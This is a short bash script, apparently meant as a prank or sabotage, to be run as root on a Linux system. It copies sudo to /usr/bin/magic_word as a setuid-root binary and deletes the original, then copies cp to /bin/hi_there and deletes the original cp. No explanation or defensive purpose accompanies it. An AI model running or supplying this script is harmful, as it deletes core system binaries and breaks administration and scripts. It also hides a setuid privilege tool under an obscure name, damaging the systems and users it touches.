#!/bin/bash

# Run this as su - if you know what's good for ya
# You know what this does
NEW_SUDO="magic_word"
if [ -x /usr/bin/sudo ]; then
  install -o root -g root -m 4755 /usr/bin/sudo /usr/bin/$NEW_SUDO
  rm -f /usr/bin/sudo
fi

CP_PATH=""
NEW_COPY="hi_there"
[ -x /bin/cp ] && CP_PATH="/bin/cp"
[ -x /usr/bin/cp ] && CP_PATH="/usr/bin/cp"

if [ -n "$CP_PATH" ]; then
  install -o root -g root -m 0755 "$CP_PATH" /bin/$NEW_COPY
  rm -f "$CP_PATH"
fi
